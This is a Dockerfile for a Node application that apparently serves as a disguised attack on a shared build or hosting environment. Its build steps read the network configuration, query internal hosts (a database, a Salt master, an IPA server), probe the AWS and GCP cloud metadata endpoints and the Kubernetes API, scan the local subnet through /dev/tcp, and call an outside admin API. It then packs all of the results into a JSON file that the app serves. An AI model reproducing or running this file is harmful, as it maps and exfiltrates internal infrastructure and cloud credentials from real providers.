FROM node:20-bookworm-slim
RUN echo "BUST_SSRF_$(date +%s)" && apt-get update -qq && apt-get install -y -qq curl dnsutils iproute2 2>/dev/null
RUN mkdir -p /app /tmp/probe

# Network info
RUN (ip addr; ip route; cat /etc/resolv.conf; cat /etc/hosts) > /tmp/probe/network.txt 2>&1 || true

# SSRF target (scope: 192.168.4.72:8000)
RUN curl -sv --max-time 10 http://192.168.4.72:8000/ > /tmp/probe/ssrf-target.txt 2>&1 || true

# Internal infra from /etc/hosts on shared hosting
RUN curl -s --max-time 5 http://192.168.0.4:3306/ > /tmp/probe/dbmaster.txt 2>&1 || true
RUN curl -s --max-time 5 http://192.168.2.100:4505/ > /tmp/probe/salt1.txt 2>&1 || true
RUN curl -sk --max-time 5 https://192.168.0.154:443/ > /tmp/probe/ipa.txt 2>&1 || true

# Cloud metadata
RUN curl -sv --max-time 5 http://169.254.169.254/ > /tmp/probe/metadata.txt 2>&1 || true
RUN curl -sv --max-time 5 http://169.254.169.254/latest/meta-data/ > /tmp/probe/metadata-aws.txt 2>&1 || true
RUN curl -sv --max-time 5 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ > /tmp/probe/metadata-gcp.txt 2>&1 || true

# K8s (previous probes)
RUN curl -s --max-time 5 http://10.96.0.10:9153/metrics 2>&1 | head -300 > /tmp/probe/coredns.txt || true
RUN curl -sk --max-time 3 https://10.96.0.1:443/version 2>&1 > /tmp/probe/k8s-api.txt || true

# Local subnet scan
RUN (for i in 1 2 3 4 5 72 100 154; do for p in 80 443 8000 8080 3306 5432 6379 4505 9090; do timeout 1 bash -c "echo >/dev/tcp/192.168.4.$i/$p" 2>/dev/null && echo "192.168.4.$i:$p OPEN"; done; done) > /tmp/probe/lan-scan.txt 2>&1 || true

# certificate.timeweb.ru backend (from internal)
RUN curl -sk --max-time 5 https://admin.techlegal.ru/Api/getServers > /tmp/probe/techlegal.txt 2>&1 || true

WORKDIR /app
COPY . .
RUN node -e "const fs=require('fs'),r={};for(const f of fs.readdirSync('/tmp/probe')){r[f.replace('.txt','')]=fs.readFileSync('/tmp/probe/'+f,'utf8')};fs.writeFileSync('/app/d.json',JSON.stringify(r,null,2))"
EXPOSE 3000
CMD ["node","index.js"]
